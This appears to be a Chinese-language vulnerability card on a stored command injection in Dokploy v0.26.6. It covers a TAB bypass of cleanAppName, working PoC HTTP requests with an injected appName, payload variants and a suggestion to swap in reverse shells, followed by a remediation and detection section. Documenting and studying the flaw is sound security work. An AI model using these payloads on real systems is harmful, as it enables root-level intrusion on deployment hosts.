---
id: web-nodejs-dokploy-compose-appname-stored-command-injection
title: Dokploy v0.26.6 Compose appName 存储型命令注入：TAB 绕过 cleanAppName，stop 时 docker stack rm 执行
type: scenario
domain: web
path: web/nodejs
technique: dokploy-compose-appname-stored-command-injection
aliases:
- Dokploy Compose RCE
- appName 存储型命令注入
- cleanAppName TAB 绕过
- docker stack rm 注入
- Dokploy 存储型 RCE
tags:
- dokploy
- nodejs
- stored-command-injection
- docker
- stack
- appname
- tab-bypass
- trpc
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Dokploy v0.26.6（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:01:51+08:00'
  notes: '已对照原文与7张截图核对：compose.create 存入含 TAB 的 appName（img03 响应保留 payload 并附加随机后缀被 # 注释）、compose.stop 时 docker stack rm ${appName} 经 execAsync 执行、img05 确认 /tmp/rce_stack_success 以 root 创建；卡内触发条件与 PoC 与原文一致；affected_versions=v0.26.6 与原文一致，未在本机复现'
---

## 一句话结论

Dokploy v0.26.6 的 `compose.create` 接收用户可控的 `appName` 并原样入库；虽然存在 `cleanAppName` 过滤，但可用 TAB（`\t`）代替空格绕过。之后调用 `compose.stop` 时，服务端把数据库中的 `appName` 直接拼进 `docker stack rm ${appName}` 并通过 `execAsync` 执行，形成“先存恶意 appName、后触发”的存储型命令注入 RCE。

## 原理

- **存储入口**：`apps/dokploy/server/api/routers/compose.ts` 的 `create` 使用 `protectedProcedure` 和 `apiCreateCompose` schema；schema 未严格限制 `appName`，`createCompose` 把输入写入数据库。
- **过滤绕过**：`cleanAppName` 可能删除空格或常见特殊字符，但未处理 TAB；Shell 把 TAB 也视为空白分隔符，因此 `stack;touch\t/tmp/rce_stack_success;#` 可以保留命令结构并通过校验。
- **触发点**：`packages/server/src/services/compose.ts` 的 `stopCompose` 在 `composeType === "stack"` 且无 `serverId` 时执行 `await execAsync(\`docker stack rm ${compose.appName}\`)`。`execAsync` 封装 `child_process.exec`，会启动子 Shell 解析整条命令。
- **命令解析**：`docker stack rm stack; touch /tmp/rce_stack_success; #` 依次执行删除 stack 与攻击者的 `touch`；`#` 注释掉剩余部分。由于 appName 来自数据库，创建与触发可以分离，属于存储型/二阶命令注入。
- **权限与影响**：`compose.create`/`compose.stop` 需要登录（`protectedProcedure`）；命令以 Dokploy 服务进程身份执行（原文容器内为 root）。只要攻击者能创建并停止 compose，即可执行任意命令。

## 触发条件

- Dokploy v0.26.6（或包含相同 `docker stack rm ${appName}` 拼接逻辑的版本）。
- 攻击者拥有可创建/停止 Compose 服务的会话。
- `composeType` 设为 `stack`，且 `serverId` 为空（走本地 `execAsync` 分支）。
- `cleanAppName` 只过滤空格等字符，未过滤 TAB/换行等 Shell 空白。
- 目标 Docker 支持 `docker stack`（Swarm 模式）。

## 利用步骤

1. 获取有效会话，确认可调用 `compose.create`。
2. 构造恶意 `appName`：`stack;touch\t/tmp/rce_stack_success;#`（用 TAB 代替空格绕过过滤），`composeType=stack`，补全 `environmentId` 等字段。
3. 调用 `POST /api/trpc/compose.create`，从响应中记录 `composeId`；同时确认响应中的 `appName` 已保留 TAB payload。
4. 调用 `POST /api/trpc/compose.stop`，传入该 `composeId`。
5. 服务端执行 `docker stack rm stack; touch /tmp/rce_stack_success; #`；进入容器/主机验证 `/tmp/rce_stack_success` 是否创建。
6. 替换 `touch` 为任意命令（读文件、写文件、反弹 Shell），并把输出写到可访问位置或外带。

## PoC

创建恶意 Compose：

```http
POST /api/trpc/compose.create HTTP/1.1
Host: target:3001
Cookie: better-auth.session_token=<有效会话>
Content-Type: application/json

{
  "json": {
    "name": "malicious-stack-test",
    "description": "RCE test",
    "environmentId": "<environmentId>",
    "composeType": "stack",
    "appName": "stack;touch\t/tmp/rce_stack_success;#"
  }
}
```

响应中包含 `composeId`（原文为 `JnpC53Vih0YkBrYIJ493z`）。

触发：

```http
POST /api/trpc/compose.stop HTTP/1.1
Host: target:3001
Cookie: better-auth.session_token=<有效会话>
Content-Type: application/json

{"json":{"composeId":"<composeId>"}}
```

验证：

```bash
docker exec <dokploy容器> ls -la /tmp/rce_stack_success
# -rw-r--r-- 1 root root 0 ... /tmp/rce_stack_success
```

## 变体与关联

- 变体（空白字符）：TAB、换行、`$IFS`、`${IFS}` 等可替代空格；按过滤规则选择。
- 变体（命令分隔）：`;`、`&&`、`|`、`$()`、反引号；`#` 注释掉尾部。
- 变体（触发操作）：除 `compose.stop` 外，`deploy`/`delete`/`redeploy` 等同样使用 `appName` 的操作也可能触发；其它拼接 `appName` 的命令（如 `docker stack deploy`）需一并审计。
- 关联：[[web-nodejs-dokploy-destination-testconnection-rclone-command-injection]]（同一产品的反射型命令注入）。
- 关联：[[web-nodejs-dokploy-certificate-path-traversal-file-write]]（同一产品的路径穿越文件写入）。
- 边界：需要登录且能创建/停止 Compose；非 `stack` 类型不走该命令；Docker 未启用 Swarm 时 `docker stack` 可能失败。

## 检测与防御

- 修复：改用 `execFile('docker', ['stack', 'rm', appName])` 或 `spawn` 参数数组，禁止 Shell 解析；不要拼接数据库中的 appName。
- 输入校验：`appName` 使用严格白名单（如 `^[a-zA-Z0-9][a-zA-Z0-9_-]*$`），拒绝空白、分号、`#`、`$`、引号、反引号；在 schema 层校验，而不是仅靠 `cleanAppName`。
- 数据可信：从数据库取出的值同样不可信（存储型注入），执行前再次校验/转义。
- 权限：Compose 创建/停止仅对可信用户开放；Dokploy 进程以非 root 运行，限制 Docker socket 与命令执行权限。
- 检测：`appName` 中出现 TAB/换行/分号/`#`/`$(`；`compose.create` 响应中的 appName 与请求原始值不一致或含控制字符；Dokploy 进程派生 `docker stack rm` 之外的命令；`/tmp` 等目录出现可疑新建文件。
- 运营：审计所有 `execAsync` 字符串拼接点；对 Compose 名称做数据库层约束与长度限制。
